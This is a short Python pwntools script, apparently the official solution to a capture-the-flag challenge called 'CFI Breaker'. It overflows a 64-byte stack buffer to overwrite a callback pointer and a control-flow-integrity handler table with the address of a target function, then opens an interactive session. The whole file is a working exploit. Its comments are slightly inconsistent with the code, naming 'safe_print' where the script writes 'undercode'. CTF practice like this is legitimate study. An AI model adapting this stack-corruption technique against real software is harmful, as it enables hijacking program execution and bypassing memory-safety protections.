#!/usr/bin/env python3
# CFI Breaker Official solve
# Technique: Stack-based CFI table corruption (Data-Oriented Programming)

from pwn import *

context.binary = elf = ELF("./pod", checksec=False)
context.log_level = "info"

sh = process(elf.path)
sh = remote("127.0.0.1", 1000)

# --------------------------------------------------
# Symbols
# --------------------------------------------------
safe_echo = elf.symbols["safe_echo"]
safe_reverse = elf.symbols["safe_reverse"]
undercode = elf.symbols["undercode"]

log.info(f"safe_echo    @ {hex(safe_echo)}")
log.info(f"safe_reverse @ {hex(safe_reverse)}")
log.info(f"undercode    @ {hex(undercode)}")

# --------------------------------------------------
# Stack layout (verified in GDB)
#
# buffer[64]
# callback
# allowed_handlers[0]
# allowed_handlers[1]
# --------------------------------------------------

OFFSET_BUFFER = 64

payload  = b"A" * OFFSET_BUFFER
payload += p64(undercode)          # obj.callback = safe_print
payload += b"A"*8			 	   # padding
payload += p64(undercode)          # allowed_handlers[0] = safe_print

sh.send(payload)
sh.interactive()
